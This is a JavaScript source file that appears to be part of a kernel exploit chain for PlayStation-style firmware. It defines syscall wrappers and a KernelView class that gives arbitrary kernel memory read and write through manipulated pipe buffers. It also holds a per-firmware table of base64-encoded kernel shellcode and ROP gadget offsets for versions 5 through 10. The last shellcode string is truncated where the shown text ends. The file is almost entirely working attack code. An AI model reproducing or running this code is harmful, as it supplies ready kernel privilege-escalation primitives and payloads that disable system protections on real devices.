"use strict";

//#region Constants
var KERNEL_PID = 0;

var PAGE_SIZE = 0x4000;

var SYSCORE_AUTHID = new BigInt("0x4800000000000007");

var FIOSETOWN = 0x8004667C;

var F_SETFL = 4;

var O_NONBLOCK = 4;

var AF_UNIX = 1;
var AF_INET = 2;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var SOCK_DGRAM = 2;
var SOL_SOCKET = 0xFFFF;
var SO_REUSEADDR = 4;
var SO_LINGER = 0x80;
var SO_SNDBUF = 0x1001;

var IPPROTO_TCP = 6;
var IPPROTO_IPV6 = 41;

var TCP_INFO = 32;
var TCPS_ESTABLISHED = 4;

var IPV6_2292PKTOPTIONS = 25;
var IPV6_PKTINFO = 46;
var IPV6_NEXTHOP = 48;
var IPV6_RTHDR = 51;
var IPV6_TCLASS = 61;

var UCRED_SIZE = 0x168;
var KQUEUE_SIZE = 0x100;
var TCP_INFO_SIZE = 0xEC;
var FILEDESCENT_SIZE = 8;

var master_pipe = new Array(2);
var slave_pipe = new Array(2);

var spray_rthdr0_len = undefined;
var spray_rthdr0_addr = undefined;
var leak_rthdr0_addr = undefined;

var kernel_base = undefined;
var fdt_ofiles = undefined;
var allproc =  undefined;

var kv = undefined;

var getpid = new NativeFunction(0x14, "bigint");
var pipe = new NativeFunction(0x2A, "bigint");
var ioctl = new NativeFunction(0x36, "bigint");
var fcntl = new NativeFunction(0x5C, "bigint");
var socket = new NativeFunction(0x61, "bigint");
var setsockopt = new NativeFunction(0x69, "bigint");
var getsockopt = new NativeFunction(0x76, "bigint");
var kexec = new NativeFunction(0x295, "bigint");
//#endregion
//#region Classes
class KernelView {
    constructor(master_pipe, slave_pipe) {
        this.view = new DataView(new ArrayBuffer(8));

        if (!Array.isArray(master_pipe) || master_pipe.length !== 2) {
            throw new Error("pipe should have 2 fds for r/w");
        }

        if (!Array.isArray(slave_pipe) || slave_pipe.length !== 2) {
            throw new Error("pipe should have 2 fds for r/w");
        }

        this.master_pipe = master_pipe;
        this.slave_pipe = slave_pipe;

        if (fcntl.invoke(this.master_pipe[0], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);
        }

        if (fcntl.invoke(this.master_pipe[1], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);
        }

        if (fcntl.invoke(this.slave_pipe[0], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[0]}`);
        }

        if (fcntl.invoke(this.slave_pipe[1], F_SETFL, O_NONBLOCK).eq(-1)) {
            throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[1]}`);
        }
        
        this.pipe_buf = pipebuf.from(alloc(pipebuf.sizeof));

        this.pipe_buf.in = 0;
        this.pipe_buf.out = 0;
        this.pipe_buf.size = PAGE_SIZE;
    }

    get_backing() {
        return this.pipe_buf.buffer;
    }

    set_backing(addr) {
        if (!(addr instanceof BigInt)) {
            throw new Error(`${addr} is not a BigInt !!`);
        }

        if (addr.eq(0)) {
            throw new Error("Empty addr !!");
        }

        this.pipe_buf.buffer = addr;
    }

    set_length(length) {
        if (length < 0 && length > 0xFFFFFFFF) {
            throw new RangeError(`size ${length} out of range !!`);
        }

        this.pipe_buf.cnt = length;
    }

    flush() {
        if (write.invoke(this.master_pipe[1], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);
        }

        if (read.invoke(this.master_pipe[0], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);
        }
    }

    kread(dst, src, sz) {
        this.set_backing(src);
        this.set_length(sz);
        this.flush();

        var n = read.invoke(this.slave_pipe[0], dst, sz);
        if (n.eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);
        }

        debug(`kread: ${n.valueOf()} byte(s) - ${dst} <= ${src}${(dst.eq(this.view.get_backing()) ? ` - value: ${this.view.getBigInt(0, true)}` : "")}`);

        return n;
    }

    kwrite(dst, src, sz) {
        this.set_backing(dst);
        this.set_length(sz);
        this.flush();

        var n = write.invoke(this.slave_pipe[1], src, sz);
        if (n.eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);
        }

        debug(`kwrite: ${n.valueOf()} byte(s) - ${src} => ${dst}${(src.eq(this.view.get_backing()) ? ` - value: ${this.view.getBigInt(0, true)}` : "")}`);

        return n;
    }

    getFloat32(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 4);

        return this.view.getFloat32(0, littleEndian);
    }

    getFloat64(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 8);

        return this.view.getFloat64(0, littleEndian);
    }

    getInt8(byteOffset) {
        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 1);

        return this.view.getInt8(0);
    }

    getInt16(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 2);

        return this.view.getInt16(0, littleEndian);
    }

    getInt32(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 4);

        return this.view.getInt32(0, littleEndian);
    }

    getUint8(byteOffset) {
        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 1);

        return this.view.getUint8(0);
    }

    getUint16(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 2);

        return this.view.getUint16(0, littleEndian);
    }

    getUint32(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 4);

        return this.view.getUint32(0, littleEndian);
    }

    getBigInt(byteOffset, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.kread(this.view.get_backing(), this.get_backing().add(byteOffset), 8);

        return this.view.getBigInt(0, littleEndian);
    }

    setFloat32(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setFloat32(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 4);
    }

    setFloat64(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setFloat64(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 8);
    }

    setInt8(byteOffset, value) {
        this.view.setBigInt(0, 0, true);
        this.view.setInt8(0, value);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 1);
    }

    setInt16(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setInt16(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 2);
    }

    setInt32(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setInt32(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 4);
    }

    setUint8(byteOffset, value) {
        this.view.setBigInt(0, 0, true);
        this.view.setUint8(0, value);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 1);
    }

    setUint16(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setUint16(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 2);
    }

    setUint32(byteOffset, value, littleEndian) {
        littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

        this.view.setBigInt(0, 0, true);
        this.view.setUint32(0, value, littleEndian);

        this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 4);
    }

    setBigInt(byteOffset, value, littleEndian) {
      littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;
      value = value instanceof BigInt ? value : new BigInt(value);

      this.view.setBigInt(0, value, littleEndian);

      this.kwrite(this.get_backing().add(byteOffset), this.view.get_backing(), 8);
    }
};

class KernelMisc {
    static get_property(version, name) {
        for (var major = version.major; major >= 0; major--) {
            if (major in KernelMisc.Map) {
                for (var minor = major === version.major ? version.minor : 0xFF; minor >= 0; minor--) {
                    if (minor in KernelMisc.Map[major] && name in KernelMisc.Map[major][minor]) {
                        var value = KernelMisc.Map[major][minor][name];
                        if (value === -1) {
                            throw new Error(`${name} offset is not supported for ${version}`);
                        }

                        return value;
                    }
                }
            }
        }

        throw new Error(`${version} has no property ${name} !!`);
    }

    static SHELLCODE(version) { return KernelMisc.get_property(version, "SHELLCODE"); }
    static SYSENT_661(version) { return KernelMisc.get_property(version, "SYSENT_661"); }
    static JMP_RSI_GADGET(version) { return KernelMisc.get_property(version, "JMP_RSI_GADGET"); }
    static KL_LOCK(version) { return KernelMisc.get_property(version, "KL_LOCK"); }
    static EVF_OFFSET(version) { return KernelMisc.get_property(version, "EVF_OFFSET"); }
};
//#endregion
//#region Static
KernelMisc.Map = {
    5: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sEAABBuJDp//9IgcKgMgEAxoG9CgAA68aBbaMeAOvGgbGjHgDrxoEtpB4A68aBcaQeAOvGgQ2mHgDrxoE9qh4A68aB/aoeAOvHgZMEAAAAAAAAxoHFBAAA62aJgbwEAABmibG4BAAAxoF9SgUA62aJufg6GgBmRImBKn4jAMeBUCMrAEgxwMPGgRDVEwA3xoET1RMAN8eBIMgHAQIAAABIiZEoyAcBx4FMyAcBAQAAAA8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1084200,
            JMP_RSI_GADGET: 0x13460,
            EVF_OFFSET: 0x7B3ED4
        },
        3: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sEAABBuJDp//9IgcKgMgEAxoG9CgAA68aBfaQeAOvGgcGkHgDrxoE9pR4A68aBgaUeAOvGgR2nHgDrxoFNqx4A68aBDaweAOvHgZMEAAAAAAAAxoHFBAAA62aJgbwEAABmibG4BAAAxoF9SgUA62aJuQg8GgBmRImBOn8jAMeBICYrAEgxwMPGgSDWEwA3xoEj1hMAN8eBIMgHAQIAAABIiZEoyAcBx4FMyAcBAQAAAA8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1084200,
            JMP_RSI_GADGET: 0x13460,
            EVF_OFFSET: 0x7B42E4
        },
        5: {
            EVF_OFFSET: 0x7B42E4
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcLMrQAAxoHtCgAA68aBDVlAAOvGgVFZQADrxoHNWUAA68aBEVpAAOvGgb1bQADrxoFtYEAA68aBPWFAAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHNBwEA62ZEiYGY7gIAZkSJiQo5BgDHgTABQABIMcDDxoHZJTwAN8aB3CU8ADfHgdBeEQECAAAASImR2F4RAceB/F4RAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x111D8B0,
            JMP_RSI_GADGET: 0xAF8C,
            EVF_OFFSET: 0x80EF12
        },
        0x53: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcLMrQAAxoHtCgAA68aBDVhAAOvGgVFYQADrxoHNWEAA68aBEVlAAOvGgb1aQADrxoFtX0AA68aBPWBAAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHNBwEA62ZEiYGY7gIAZkSJiQo5BgDHgTAAQABIMcDDxoHZJDwAN8aB3CQ8ADfHgdBeEQECAAAASImR2F4RAceB/F4RAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            EVF_OFFSET: 0x80EDE2
        },
        0x55: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcLMrQAAxoHtCgAA68aBzVtAAOvGgRFcQADrxoGNXEAA68aB0VxAAOvGgX1eQADrxoEtY0AA68aB/WNAAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHNBwEA62ZEiYGY7gIAZkSJiQo5BgDHgfADQABIMcDDxoGZKDwAN8aBnCg8ADfHgdCuEQECAAAASImR2K4RAceB/K4RAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x11228B0,
            EVF_OFFSET: 0x80F482
        },
        0x56: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcIJ7wMAxoHdCgAA68aBTUYRAOvGgZFGEQDrxoENRxEA68aBUUcRAOvGgf1IEQDrxoGtTREA68aBfU4RAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHtkAIA62ZEiYFYIjUAZkSJiVr2JwDHgRCoAQBIMcDDxoFtAiQAN8aBcAIkADfHgVC3EQECAAAASImRWLcRAceBfLcRAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x1123130,
            JMP_RSI_GADGET: 0x3F0C9,
            EVF_OFFSET: 0x7C8971
        }
    }, 
    6: {
        0: {
            SHELLCODE: "", // TODO
        },
        0x20: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC4kOn//77rAAAAv+sAAABBuOsEAABBuZDp//9IgcKuvAIAxoHdCgAA68aBTUYRAOvGgZFGEQDrxoENRxEA68aBUUcRAOvGgf1IEQDrxoGtTREA68aBfU4RAOvHgZAEAAAAAAAAZomBxgQAAGaJsb0EAABmibm5BAAAxoHtkAIA62ZEiYF4IjUAZkSJiXr2JwDHgRCoAQBIMcDDxoFtAiQAN8aBcAIkADfHgVD3EQECAAAASImRWPcRAceBfPcRAQEAAAAPIMBIDQAAAQAPIsAxwMM=",
            SYSENT_661: 0x1127130,
            JMP_RSI_GADGET: 0X2BE6E,
            EVF_OFFSET: 0x7C8E31
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYEOxWMAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcJNoxUAxoHNCgAA68aBTRE8AOvGgZERPADrxoENEjwA68aBURI8AOvGgf0TPADrxoGtGDwA68aBfRk8AOtmibEPzmMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoEnuxAA62ZEiZEIGkUAZkSJmR6AHQBmiYGqhR0Ax4Egn0EASDHAw8aBerUKADfGgX21CgA3x4EQ0hEBAgAAAEiJkRjSEQHHgTzSEQEBAAAADyDASA0AAAEADyLAMcDD",
            SYSENT_661: 0x1124BF0,
            JMP_RSI_GADGET: 0x15A50D,
            EVF_OFFSET: 0x7C6019
        },
        0x51: {
            EVF_OFFSET: 0x7C6099
        },
        0x70: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYHOyGMAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcJdzwkAxoHNCgAA68aB/RQ8AOvGgUEVPADrxoG9FTwA68aBARY8AOvGga0XPADrxoFdHDwA68aBLR08AOtmibHP0WMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoHXvhAA62ZEiZG4HUUAZkSJmc6DHQBmiYFaiR0Ax4HQokEASDHAw8aBerUKADfGgX21CgA3x4EQ4hEBAgAAAEiJkRjiEQHHgTziEQEBAAAADyDASA0AAAEADyLAMcDD",
            SYSENT_661: 0x1125BF0,
            JMP_RSI_GADGET: 0x9D11D,
            EVF_OFFSET: 0x7C7829
        }
    },
    7: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYHOrGMAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcLSrwYAxoHNCgAA68aBje8CAOvGgdHvAgDrxoFN8AIA68aBkfACAOvGgT3yAgDrxoHt9gIA68aBvfcCAOtmibHvtWMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoF3ewgA62ZEiZEITCYAZkSJmcFOCQBmiYF7VAkAx4EgLC8ASDHAw8aBNiMdADfGgTkjHQA3x4FwWBIBAgAAAEiJkXhYEgHHgZxYEgEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsHAADGgbEbSgDrZomB7htKAEi4QYO/oAQAAABIiYH3G0oAuEmL///Ggf8bSgCQxoEIHEoAh8aBFRxKALfGgS0cSgCHxoE6HEoAt8aBUhxKAL/GgV4cSgC/xoFqHEoAv8aBdhxKAL9miYGFHEoAxoGHHEoA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x112D250,
            JMP_RSI_GADGET: 0x6B192,
            EVF_OFFSET: 0x7F92CB
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv5Dp//9BuOsAAABmiYGUc2MAQbnrAAAAQbrrBAAAQbuQ6f//uJDp//9IgcKC9gEAxoHdCgAA68aBTfcoAOvGgZH3KADrxoEN+CgA68aBUfgoAOvGgf35KADrxoGt/igA68aBff8oAOtmibHPfGMAx4GQBAAAAAAAAGaJucYEAABmRImBvQQAAGZEiYm5BAAAxoEnozcA62ZEiZHIFDAAZkSJmQQeRQBmiYHEI0UAx4EwmgIASDHAw8aBfbENADfGgYCxDQA3x4FQJRIBAgAAAEiJkVglEgHHgXwlEgEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsDAAC6BQAAADH2Mf9miYH1IAsAQbgBAAAASLhBg76gBAAAAEG5AQAAAEiJgfogCwC4BAAAAEG6TIn//2aJgQwhCwC4BAAAAGaJgRkhCwC4BQAAAMeBAyILAOny/v/GgQciCwD/x4EIIQsASYuG0MaBDiELAADHgRUhCwBJi7awxoEbIQsAAMeBLSELAEmLhkBmiYExIQsAxoEzIQsAAMeBOiELAEmLtiBmiZE+IQsAxoFAIQsAAMeBUiELAEmNvsBmibFWIQsAxoFYIQsAAMeBXiELAEmNvuBmibliIQsAxoFkIQsAAMeBcSELAEmNvgBmRImBdSELAMaBdyELAADHgX0hCwBJjb4gZkSJiYEhCwDGgYMhCwAAZkSJkY4hCwDGgZAhCwD3DyDASA0AAAEADyLAMcDD",
            SYSENT_661: 0x1129F30,
            JMP_RSI_GADGET: 0x1F842,
            EVF_OFFSET: 0x79A92E
        },
        0x51: {
            EVF_OFFSET: 0x79A96E
        }
    },
    8: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLcYA4AZomBVNJiAMaBzQoAAOvGgQ3hJQDrxoFR4SUA68aBzeElAOvGgRHiJQDrxoG94yUA68aBbeglAOvGgT3pJQDrZomxP9tiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoGW1jQA62ZEiYmLxj4AZkSJkYSNMQDGgT+VMQDrx4HAUQkASDHAw8aBOtAPADfGgT3QDwA3x4Hgxg8BAgAAAEiJkejGDwHHgQzHDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBg/EJAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgYvxCQC4BAAAAEG5SYv//2aJgZ3xCQC4BAAAAGaJgarxCQC4BQAAAGaJgcLxCQC4BQAAAGZEiZlB8QkAx4GZ8QkASYuH0MaBn/EJAADHgabxCQBJi7ewxoGs8QkAAMeBvvEJAEmLh0DGgcTxCQAAx4HL8QkASYu3IGaJgc/xCQDGgdHxCQAAx4Hj8QkASY2/wGaJkefxCQDGgenxCQAAx4Hv8QkASY2/4GaJsfPxCQDGgfXxCQAAx4EC8gkASY2/AGaJuQbyCQDGgQjyCQAAx4EO8gkASY2/IGZEiYES8gkAxoEU8gkAAGZEiYkf8gkAxoEh8gkA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x11040C0,
            JMP_RSI_GADGET: 0xE629C,
            EVF_OFFSET: 0x7EDCFF
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcJNfwwAZomBdEZiAMaBzQoAAOvGgT1AOgDrxoGBQDoA68aB/UA6AOvGgUFBOgDrxoHtQjoA68aBnUc6AOvGgW1IOgDrZomxX09iAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoHW8yIA62ZEiYnb1hQAZkSJkXR0AQDGgS98AQDrx4FA0DoASDHAw8aB6iYIADfGge0mCAA3x4HQxw8BAgAAAEiJkdjHDwHHgfzHDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBYwIDAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgWsCAwC4BAAAAEG5SYv//2aJgX0CAwC4BAAAAGaJgYoCAwC4BQAAAGaJgaICAwC4BQAAAGZEiZkhAgMAx4F5AgMASYuH0MaBfwIDAADHgYYCAwBJi7ewxoGMAgMAAMeBngIDAEmLh0DGgaQCAwAAx4GrAgMASYu3IGaJga8CAwDGgbECAwAAx4HDAgMASY2/wGaJkccCAwDGgckCAwAAx4HPAgMASY2/4GaJsdMCAwDGgdUCAwAAx4HiAgMASY2/AGaJueYCAwDGgegCAwAAx4HuAgMASY2/IGZEiYHyAgMAxoH0AgMAAGZEiYn/AgMAxoEBAwMA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x11041B0,
            JMP_RSI_GADGET: 0xC810D,
            EVF_OFFSET: 0x7DA91C
        }
    },
    9: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLtxQQAZomBdGhiAMaBzQoAAOvGgf0TJwDrxoFBFCcA68aBvRQnAOvGgQEVJwDrxoGtFicA68aBXRsnAOvGgS0cJwDrZomxX3FiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoEGGgAA62ZEiYmLCwgAZkSJkcSuIwDGgX+2IwDrx4FAGyIASDHAw8aBKmMWADfGgS1jFgA3x4EgBRABAgAAAEiJkSgFEAHHgUwFEAEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBQ1pBAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgUtaQQC4BAAAAEG5SYv//2aJgV1aQQC4BAAAAGaJgWpaQQC4BQAAAGaJgYJaQQC4BQAAAGZEiZkBWkEAx4FZWkEASYuH0MaBX1pBAADHgWZaQQBJi7ewxoFsWkEAAMeBflpBAEmLh0DGgYRaQQAAx4GLWkEASYu3IGaJgY9aQQDGgZFaQQAAx4GjWkEASY2/wGaJkadaQQDGgalaQQAAx4GvWkEASY2/4GaJsbNaQQDGgbVaQQAAx4HCWkEASY2/AGaJucZaQQDGgchaQQAAx4HOWkEASY2/IGZEiYHSWkEAxoHUWkEAAGZEiYnfWkEAxoHhWkEA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1107F00,
            JMP_RSI_GADGET: 0x4C7AD,
            KL_LOCK: 0x3977F0,
            EVF_OFFSET: 0x7F6F27
        },
        3: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKbMAUAZomBNEhiAMaBzQoAAOvGgX0QJwDrxoHBECcA68aBPREnAOvGgYERJwDrxoEtEycA68aB3RcnAOvGga0YJwDrZomxH1FiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoEGGgAA62ZEiYmLCwgAZkSJkZSrIwDGgU+zIwDrx4EQGCIASDHAw8aB2mIWADfGgd1iFgA3x4EgxQ8BAgAAAEiJkSjFDwHHgUzFDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBszlBAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbs5QQC4BAAAAEG5SYv//2aJgc05QQC4BAAAAGaJgdo5QQC4BQAAAGaJgfI5QQC4BQAAAGZEiZlxOUEAx4HJOUEASYuH0MaBzzlBAADHgdY5QQBJi7ewxoHcOUEAAMeB7jlBAEmLh0DGgfQ5QQAAx4H7OUEASYu3IGaJgf85QQDGgQE6QQAAx4ETOkEASY2/wGaJkRc6QQDGgRk6QQAAx4EfOkEASY2/4GaJsSM6QQDGgSU6QQAAx4EyOkEASY2/AGaJuTY6QQDGgTg6QQAAx4E+OkEASY2/IGZEiYFCOkEAxoFEOkEAAGZEiYlPOkEAxoFROkEA/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1103F00,
            JMP_RSI_GADGET: 0x5325B,
            KL_LOCK: 0x3959F0,
            EVF_OFFSET: 0x7F4CE7
        },
        0x50: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKtWAEAZomB5EpiAMaBzQoAAOvGgQ0cIADrxoFRHCAA68aBzRwgAOvGgREdIADrxoG9HiAA68aBbSMgAOvGgT0kIADrZomxz1NiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoE2pR8A62ZEiYk7bRkAZkSJkST3GQDGgd/+GQDrx4FgGQEASDHAw8aBei0SADfGgX0tEgA3x4EAlQ8BAgAAAEiJkQiVDwHHgSyVDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBs3cNAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbt3DQC4BAAAAEG5SYv//2aJgc13DQC4BAAAAGaJgdp3DQC4BQAAAGaJgfJ3DQC4BQAAAGZEiZlxdw0Ax4HJdw0ASYuH0MaBz3cNAADHgdZ3DQBJi7ewxoHcdw0AAMeB7ncNAEmLh0DGgfR3DQAAx4H7dw0ASYu3IGaJgf93DQDGgQF4DQAAx4ETeA0ASY2/wGaJkRd4DQDGgRl4DQAAx4EfeA0ASY2/4GaJsSN4DQDGgSV4DQAAx4EyeA0ASY2/AGaJuTZ4DQDGgTh4DQAAx4E+eA0ASY2/IGZEiYFCeA0AxoFEeA0AAGZEiYlPeA0AxoFReA0A/w8gwEgNAAABAA8iwDHAww==",
            SYSENT_661: 0x1100EE0,
            JMP_RSI_GADGET: 0x15A6D,
            KL_LOCK: 0x85EE0,
            EVF_OFFSET: 0x769A88
        }
    }, 
    10: {
        0: {
            SHELLCODE: "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLxZgAAZomBZOhhAMaBzQoAAOvGgW0sRwDrxoGxLEcA68aBLS1HAOvGgXEtRwDrxoEdL0cA68aBzTNHAOvGgZ00RwDrZomxT/FhAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoFWdyYA62ZEiYl7IDkAZkSJkaT6GADGgV8CGQDrx4FA6hsASDHAw8aBmtUOADfGgZ3VDgA3x4GgLxABAgAAAEiJkagvEAHHgcwvEAEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBgzYtAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgYs2LQC4BAAAAEG5SYv//2aJgZ02LQC4BAAAAGaJgao2LQC4BQAAAGaJgcI2LQC4BQAAAGZEiZlBNi0Ax4GZNi0ASYuH0MaBnzYtAADHgaY2LQBJi7ewxoGsNi0AAMeBvjYtAEmLh0DGgcQ2LQAAx4HLNi0ASYu3IGaJgc82LQDGgdE2LQAAx4HjNi0ASY2/wGaJkec2LQDGgek2LQAAx4HvNi0ASY2/4GaJsfM2LQDGgfU2LQAAx4ECNy0ASY2/AGaJuQY3LQDGgQg3LQAAx4EONy0ASY2/IGZEiYESNy0AxoEUNy0AAGZEiYkfNy0AxoEhNy0A/w8gw